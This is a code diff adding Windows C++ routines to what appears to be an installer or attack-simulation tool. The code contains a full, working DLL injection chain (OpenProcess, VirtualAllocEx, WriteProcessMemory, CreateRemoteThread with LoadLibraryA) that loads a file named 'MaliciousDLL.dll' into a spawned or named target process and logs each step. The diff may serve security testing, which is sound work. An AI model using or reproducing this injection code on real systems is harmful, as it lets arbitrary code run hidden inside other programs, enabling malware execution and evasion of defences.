@@ -452,3 +452,192 @@ void PerformMaliciousInjection()
         injectionSuccessful = false;
     }
 }
+DWORD SpawnTargetProcess()
+{
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    // Spawn notepad.exe as target
+    if (!CreateProcessA(
+        "C:\\Windows\\System32\\notepad.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        0,
+        NULL,
+        NULL,
+        &si,
+        &pi))
+    {
+        LogActivity("CreateProcess failed. Error: " + std::to_string(GetLastError()));
+        return 0;
+    }
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    // Give it time to initialize
+    Sleep(500);
+
+    return pi.dwProcessId;
+}
+
+std::string GetDLLPath()
+{
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
+    
+    std::string pathStr(exePath);
+    size_t pos = pathStr.find_last_of("\\");
+    std::string dllPath = pathStr.substr(0, pos + 1) + "MaliciousDLL.dll";
+    
+    return dllPath;
+}
+
+DWORD GetProcessIdByName(const wchar_t* processName)
+{
+    DWORD processId = 0;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (snapshot != INVALID_HANDLE_VALUE)
+    {
+        PROCESSENTRY32W pe32;
+        pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+        if (Process32FirstW(snapshot, &pe32))
+        {
+            do
+            {
+                if (_wcsicmp(pe32.szExeFile, processName) == 0)
+                {
+                    processId = pe32.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(snapshot, &pe32));
+        }
+        CloseHandle(snapshot);
+    }
+
+    return processId;
+}
+
+bool InjectDLL(DWORD processId, const char* dllPath)
+{
+    HANDLE hProcess = nullptr;
+    LPVOID pDllPath = nullptr;
+    HANDLE hThread = nullptr;
+
+    try
+    {
+        LogActivity("  -> Opening target process...");
+
+        // Open process with required permissions
+        hProcess = OpenProcess(
+            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+            FALSE, processId);
+
+        if (hProcess == nullptr)
+        {
+            LogActivity("  -> FAILED: OpenProcess error " + std::to_string(GetLastError()));
+            return false;
+        }
+        LogActivity("  -> Process handle acquired");
+
+        // Allocate memory in target process (VirtualAllocEx)
+        LogActivity("  -> Allocating memory (VirtualAllocEx)...");
+        size_t dllPathSize = strlen(dllPath) + 1;
+        pDllPath = VirtualAllocEx(hProcess, nullptr, dllPathSize,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+        if (pDllPath == nullptr)
+        {
+            LogActivity("  -> FAILED: VirtualAllocEx error " + std::to_string(GetLastError()));
+            CloseHandle(hProcess);
+            return false;
+        }
+        
+        std::stringstream ss;
+        ss << "  -> Memory allocated at 0x" << std::hex << (DWORD_PTR)pDllPath;
+        LogActivity(ss.str());
+
+        // Write DLL path to target memory (WriteProcessMemory)
+        LogActivity("  -> Writing DLL path (WriteProcessMemory)...");
+        SIZE_T bytesWritten;
+        if (!WriteProcessMemory(hProcess, pDllPath, dllPath, dllPathSize, &bytesWritten))
+        {
+            LogActivity("  -> FAILED: WriteProcessMemory error " + std::to_string(GetLastError()));
+            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return false;
+        }
+        LogActivity("  -> Wrote " + std::to_string(bytesWritten) + " bytes");
+
+        // Get LoadLibraryA address
+        LogActivity("  -> Resolving LoadLibraryA address...");
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
+
+        if (pLoadLibraryA == nullptr)
+        {
+            LogActivity("  -> FAILED: GetProcAddress error");
+            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return false;
+        }
+        
+        std::stringstream ss2;
+        ss2 << "  -> LoadLibraryA at 0x" << std::hex << (DWORD_PTR)pLoadLibraryA;
+        LogActivity(ss2.str());
+
+        // Create remote thread (CreateRemoteThread)
+        LogActivity("  -> Creating remote thread (CreateRemoteThread)...");
+        hThread = CreateRemoteThread(hProcess, nullptr, 0,
+            (LPTHREAD_START_ROUTINE)pLoadLibraryA,
+            pDllPath, 0, nullptr);
+
+        if (hThread == nullptr)
+        {
+            LogActivity("  -> FAILED: CreateRemoteThread error " + std::to_string(GetLastError()));
+            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return false;
+        }
+        LogActivity("  -> Remote thread created successfully");
+
+        // Wait for thread to complete
+        LogActivity("  -> Waiting for DLL to load...");
+        WaitForSingleObject(hThread, 5000);
+        LogActivity("  -> Injection complete!");
+
+        // Cleanup
+        CloseHandle(hThread);
+        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+
+        return true;
+    }
+    catch (...)
+    {
+        if (hThread) CloseHandle(hThread);
+        if (pDllPath && hProcess) VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+        if (hProcess) CloseHandle(hProcess);
+        return false;
+    }
+}
+
+void LogActivity(const std::string& message)
+{
+    std::ofstream logFile(SENTRIX_INSTALLER_LOG, std::ios::app);
+
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+
+    char timestamp[64];
+    sprintf_s(timestamp, "[%04d-%02d-%02d %02d:%02d:%02d] ",
+        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+
+    logFile << timestamp << message << std::endl;
+    logFile.close();
+}
